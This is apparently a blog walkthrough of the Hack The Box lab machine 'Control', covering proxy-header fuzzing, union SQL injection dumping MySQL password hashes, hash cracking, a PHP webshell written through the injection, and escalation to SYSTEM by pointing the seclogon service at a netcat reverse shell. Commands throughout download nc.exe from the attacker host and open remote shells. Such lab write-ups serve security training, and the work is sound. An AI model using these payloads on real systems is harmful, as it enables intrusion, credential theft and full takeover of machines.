---
layout: single
title: Control - Hack The Box
excerpt: "Control is hard difficulty Windows machine featuring a Corporate Interal website which we can access through proxy and it is vulnerable to SQL Injection. This leverage to extral MySQL usersname and password hashes, and also write webshell using SQLi to gain the Initial foothold. By cracking the password hash of hector user helps us to  move laterally to his windodws account. Examining the Powershell history file reveals that Registry Permissions may have been modified. After Enumerating Registry Service permissions and other service properties, seclogon service is abused to escalate shell as NT AUTHORITY SYSTEM."
date: 2020-04-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-control/control_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - OSCP
  - IIS
  - Registry Services
  - SQLi
  - Proxy
  - Hashcat
  - Cracking
  - webshell
  - Powershell
---

![](/assets/images/htb-writeup-control/control_logo.png)

## Synopsis
Control is hard difficulty Windows machine featuring a Corporate Interal website which we can access through `proxy` and it is vulnerable to `SQL Injection`. This leverage to extral MySQL usersname and password `hashes`, and also `write webshell` using SQLi to gain the Initial foothold. By `cracking` the password hash of hector user helps us to  move laterally to his windodws account. Examining the `Powershell history` file reveals that `Registry Permissions` may have been modified. After Enumerating Registry Service permissions and other service properties, `seclogon` service is abused to escalate shell as `NT AUTHORITY\SYSTEM`.

## Skills Required
* Basic Knowledge of windows

## Skills Learned
* Basic SQL Injection
* Hash cracking
* Service Enumeration
* Windows Defender Evasion

---
## Enumeration
### Nmap
```java
# Nmap 7.80 scan initiated Mon Apr 20 19:06:28 2020 as: nmap -Pn -sC -sV -v -p80,135,3306,49666,49667 -oN full.nmap control.htb
Nmap scan report for control.htb (10.10.10.167)
Host is up (0.19s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.15.115' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=4/20%Time=5E9DA55D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.115'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Looking at Nmap results. we see `MySQL` and `IIS` running on their default ports. `IIS` Version is `10.0` which indicates this is either `Windows server 2016` or `Windows server 2019`.

### HTTP Proxy
Navigating to the port `80`. we're presented with a website name `Fidelity`.

![](/assets/images/htb-writeup-control/Fidelity.png)

Browsing through the website we've `/about.php` and `/admin.php` endpoints. Based on the extensions we can confirm that we're dealing with a `php` application. `/about.php` has some sample text and nothing interesting on it. Navigating to `/admin.php` gives us `Access Denied: Header Missing`.

![](/assets/images/htb-writeup-control/access.png)

Looking at the page source on `/index.php` give us some Info in comments.

![](/assets/images/htb-writeup-control/src.png)

It contains a to-do list which has an `IP` address init. 

Now, we'll look at the `HTTP Header` missing for `proxy` on `/admin.php`. Searching for `HTTP Proxy Header`. I came across the `mozilla` website. which details abouthe `HTTP proxy header`.

![](/assets/images/htb-writeup-control/mozilla.png)

`/admin.php` says its request need to go through `proxy`. So, we'll add this Headers along with the `IP` address we found and make request to the website. We'll automate this process using `wfuzz`.
```
$ cat headers.txt 
Forwarded
X-Forwarded-For
X-Forwarded-Host
X-Forwarded-Proto
Via
```
```
$ wfuzz -u http://10.10.10.167/admin.php -H FUZZ:192.168.4.28 -w headers.txt --hl 0

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.167/admin.php
Total requests: 5

===================================================================
ID           Response   Lines    Word     Chars       Payload                                
===================================================================

000000002:   200        153 L    466 W    7933 Ch     "X-Forwarded-For"                      

```
`X-Forwarded-For: 192.168.4.28` gave us `HTTP 200` . Adding this header manually and navigating to `/admin.php` provides us with a `Product catalog` page. Where we've list of products we can modify and search them.

![](/assets/images/htb-writeup-control/product.png)

To automatically add `X-Forarded-For` header to our request. We'll use Burp `Match and replace` rule to add a cutsom header to our requests.

![](/assets/images/htb-writeup-control/header.png)

### SQL Injection
Let's look at the product `search` functionality present at `/search_products.php` in Burp. 

![](/assets/images/htb-writeup-control/search.png)

We'll start testing for `SQLi`. Adding a `'` to the prouductName like this `productName=Asus'` gave us `MySQL` error. So, we can confirm the `SQLi` on the `productName` parameter.

![](/assets/images/htb-writeup-control/productName.png) 

We can make our query good by adding a comment to it `productName=Asus'--+-`. This doesn't gives us any errors. since we don't have any error's in our query.

Next, we'll try to figure out number of columns this table has using `ORDER BY` statement. which helps us to do `Union Injection`. We'll start with `1` which orders the table based on first column `productName=Asus' ORDER BY 1 --+-`. We'll keep on incrementing the number untill we get an error in our response.

When we try to do `ORDER BY 7` we get a `mysql` errror in the response saying `Error: SQLSTATE[42S22]: Column not found: 1054 Unknown column '7' in 'order clause'`. This mean the table we're trying `SQLi` on has `6` columns in it. This helps us to do `union Injection` now.

We'll `Union Inject` using `numbers` like this `productName=Asus' UNION SELECT 1,2,3,4,5,6-- -` and see which columns are visible to us and return output. So, we can insert our querys Inside them.

![](/assets/images/htb-writeup-control/order.png) 

All teh columns are Injectable and we can start pulling the `data` from the `DB`. We can check the User the `DB` is running as,`version` of DB and the current Database using following query.
```
productName=Asus' UNION SELECT 1,user(),database(),@@version,5,6-- -
```
![](/assets/images/htb-writeup-control/version.png)

To list all the Databases we can user `Information_schema.schemata`.
```
productName=Asus' UNION SELECT 1,SCHEMA_NAME,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```
This query gives us three `DB` names: `Information_schema`, `mysql`, `warehouse`. Since we're intereseted in `user credential` we can grab the username and password from `mysql.user` table. Using following query.
```
  productName=test' union select 1,(SELECT group_concat(User,":",password SEPARATOR '\n') from mysql.user),3,4,5,6-- -
```
![](/assets/images/htb-writeup-control/user.png)

We got the `username` and `password` hashes from the table. 
```
root:*0A4A5CAD344718DC418035A1F4D292BA603134D8
manager:*CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
hector:*0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
```
### Crack MySQL Passwords
`Hashcat` helps us to crack `hector` password hash. Now, we've the credentials for hector user `hector : l33th4x0rhector`.
```
$ cat hector.hash 
0E178792E8FC304A2E3133D535D38CAF1DA3CD9D

$ hashcat  -m 300 hector.hash /usr/share/wordlists/rockyou.txt --force
<SNIP>
0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector
<SNIP>
```

## FootHold
Using `Into Outfile` we can upload a `php` webshell to web root with the help of SQLi.
```
productName=Asus'+union+select+1,'<?php system($_REQUEST["cmd"]);?>',3,4,5,6 into outfile 'C:\\inetpub\\wwwroot\\mah1ndra.php'--+-
```
After requesting the URL, We can use `cmd` paramter to execute commands on the server.
```
$ curl -X POST http://10.10.10.167/mah1ndra.php --data-urlencode cmd=whoami
1       nt authority\iusr
        3       4       5       6
```
To gain a interactive `reverse shell` we'll upload `nc.exe` on to the server and make a reverse shell to our machine with help of it.
```
http://10.10.10.167/mah1ndra.php?cmd=powershell -c "iwr -uri http://10.10.15.251/nc.exe -outfile C:\temp\nc.exe"
``` 
```
http://10.10.10.167/mah1ndra.php?cmd=C:\temp\nc.exe 10.10.15.251 443 -e powershell
```

And we got a reverse shell as `nt authority\iusr`
```powershell
$ sudo rlwrap ncat -lvnp 443

Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.167.
Ncat: Connection from 10.10.10.167:49680.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot> whoami
nt authority\iusr
PS C:\inetpub\wwwroot> hostname
Fidelity
```

## Lateral Movement
Looking at the users present on the box. we can `hector` in there.
```powershell
PS C:\inetpub\wwwroot> net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
Hector                   WDAGUtilityAccount       
The command completed with one or more errors.
```
Let's get bit more details about `hecotr`. 
```powershell
PS C:\inetpub\wwwroot> net user hector
net user hector
User name                    Hector
Full Name                    Hector
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/1/2019 12:27:50 PM
Password expires             Never
Password changeable          11/1/2019 12:27:50 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   4/27/2020 7:41:00 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.
```
Since, `Hecotor` is a part of `Remote Management Users` we'll can login as hectors with the `credentials` we got previously.

We'll create a `Credential variable` here. We do this because Windows doesn't like passing passwords as plain text to a command.
```powershell
PS C:\inetpub\wwwroot> $pass = convertTo-SecureString -AsPlainText -Force -String "l33th4x0rhector"
PS C:\inetpub\wwwroot> $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "nt authority\hector",$pass
```

Now, we'll use `Invoke-Command` to run commands as hecotor, and it works.
``` powershell
PS C:\inetpub\wwwroot> Invoke-Command -ComputerName Fidelity -Credential $credential -ScriptBlock {whoami}
control\hector
```
Now, with using the same `nc.exe` at `C:\temp\` . We can obtain a reverse shell as `hector` using `Invoke-Command`.
```powershell
PS C:\inetpub\wwwroot> Invoke-Command -ComputerName Fidelity -Credential $credential -ScriptBlock {C:\temp\nc.exe 10.10.15.251 443 -e powershell}
```

And We got a shell as `Hector` user.
```powershell
$ sudo rlwrap ncat -lvnp 443

Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.167.
Ncat: Connection from 10.10.10.167:49688.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Hector\Documents> whoami
control\hector
PS C:\Users\Hector\Documents> hostname
Fidelity
```
## Privilege Escalation
Let's check Powershell `history` file, to see if we can find anything interesting there.
```powershell
PS C:\Users\Hector\Documents> gc (Get-PSReadlineOption).HistorySavePath

get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
```
It seems like `hector` has been looking at `Registry ACL's` and items under `CurrentControlSet`. Maybe they've changed the permissions somewhere. Service Properties exist as subkeys and values under the `HKLM:\SYSTEM\CurrentControlSet\Services`. If we've permissions tho this we can potentially change the `binary path` for all the services. Let's check the permissions.
```
PS C:\Users\Hector\Documents> $acl = get-acl HKLM:\System\CurrentControlSet\Services

PS C:\Users\Hector\Documents> $acl
Path                                                                                     Owner               Access    
----                                                                                     -----               ------    
Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services NT AUTHORITY\SYSTEM CREATOR...

PS C:\Users\Hector\Documents> ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights| Foreach-Object {$_.DiscretionaryAcl}

NT AUTHORITY\Authenticated Users: AccessAllowed (EnumerateSubKeys, ExecuteKey, Notify, QueryValues, ReadPermissions)
NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateLink, CreateSubKey, Delete, EnumerateSubKeys, ExecuteKey, FullControl, GenericExecute, GenericWrite, Notify, QueryValues, ReadPermissions, SetValue, TakeOwnership, WriteKey)

BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateLink, CreateSubKey, Delete, EnumerateSubKeys, ExecuteKey, FullControl, GenericExecute, GenericWrite, Notify, QueryValues, ReadPermissions, SetValue, TakeOwnership, WriteKey)

CONTROL\Hector: AccessAllowed (ChangePermissions, CreateLink, CreateSubKey, Delete, EnumerateSubKeys, ExecuteKey, FullControl, GenericExecute, GenericWrite, Notify, QueryValues, ReadPermissions, SetValue, TakeOwnership, WriteKey)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed (EnumerateSubKeys, ExecuteKey, Notify, QueryValues, ReadPermissions)
```
Although we can change the binary path values this isn't userful unless we're able to `start` a paticular services running as privileged user.

Now, we're intersed in services running as `NT Authority\SYSTEM`, which are configured with a manual start type, that we also have permission to start. 

We'll start checking for services that has `ObjectName: LocalSystem` and `Start: 3` set whcih mean `manual Startup`. `start: 2 (Autoload)` , `start: 4 (Disabled)`.
```powershell
PS C:\Users\Hector\Documents> $services = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\*

PS C:\Users\Hector\Documents> $services | where {($_.ObjectName -match 'LocalSystem') -and ($_.Start -match '3')}
<SNIP>
Description    : @%Systemroot%\system32\wbem\wmiapsrv.exe,-111
DisplayName    : @%Systemroot%\system32\wbem\wmiapsrv.exe,-110
ErrorControl   : 1
FailureActions : {132, 3, 0, 0...}
ImagePath      : C:\Windows\system32\wbem\WmiApSrv.exe
ObjectName     : localSystem
ServiceSidType : 1
Start          : 3
Type           : 16
PSPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\wmiApSrv
PSParentPath   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
PSChildName    : wmiApSrv
PSDrive        : HKLM
PSProvider     : Microsoft.PowerShell.Core\Registry
<SNIP>
```
Last thing we've to check for the services Names that we've permission to `start`. So, That we can change our their `binPath` to our `reverse shell` payload and start the service to get a shell.
```powershell
PS C:\Users\Hector\Documents> $tmp = $services | where {($_.ObjectName -match 'LocalSystem')}

PS C:\Users\Hector\Documents> $serviceNames = $tmp.pschildname

PS C:\Users\Hector\Documents> $canStart = foreach ($service in $serviceNames) { $sddl = (cmd /c sc sdshow $service); if ($sddl -match "RP[A-Z]*?;;;AU") { $service}}

PS C:\Users\Hector\Documents>$canStart
AppVClient
ConsentUxUserSvc
DevicePickerUserSvc
DevicesFlowUserSvc
PimIndexMaintenanceSvc
PrintWorkflowUserSvc
RasMan
seclogon
UevAgentService
UnistoreSvc
UserDataSvc
WaaSMedicSvc
WpnUserService
wuauserv
```
We'll configure the binary path to `seclogon` serive to execute a netcat shell.
```powershell
PS C:\Users\Hector\Documents> set-itemproperty -erroraction silentlycontinue -path HKLM:\system\currentcontrolset\services\seclogon -name imagepath -value "C:\temp\nc.exe  10.10.15.251 443 -e powershell";

PS C:\Users\Hector\Documents> start-service seclogon -erroraction silentlycontinue;
```

Starting service. we've recieved a reverse shell as `nt authority\system`.
```
$ sudo rlwrap ncat -lvnp 443

Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.167.
Ncat: Connection from 10.10.10.167:49701.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami

nt authority\system
PS C:\Windows\system32> hostname

Fidelity
```
Thank you for taking you're time for reading this blog!.
